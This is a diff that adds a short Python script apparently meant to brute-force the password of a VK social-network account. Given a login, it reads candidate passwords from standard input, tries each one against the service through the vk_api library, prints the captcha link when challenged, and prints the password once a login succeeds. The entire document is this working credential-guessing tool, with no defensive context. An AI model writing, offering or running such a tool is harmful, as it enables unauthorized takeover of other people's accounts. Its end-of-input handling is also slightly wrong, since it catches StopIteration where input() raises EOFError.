@@ -1,0 +1,27 @@
+#!/bin/env python3
+import vk_api
+import sys
+
+def pick(password):
+	s = vk_api.VkApi(login, password)
+	try:
+		s.auth()
+	except vk_api.exceptions.BadPassword :
+		pass
+	except vk_api.exceptions.Captcha as captcha:
+		print(captcha.get_url())
+	else:
+		print(password)
+		exit(0)
+
+if len(sys.argv) != 2 :
+	exit(1)
+login = sys.argv[1]
+
+try:
+	while True :
+		s = input()
+		pick(s)
+except StopIteration :
+	exit(1)
+
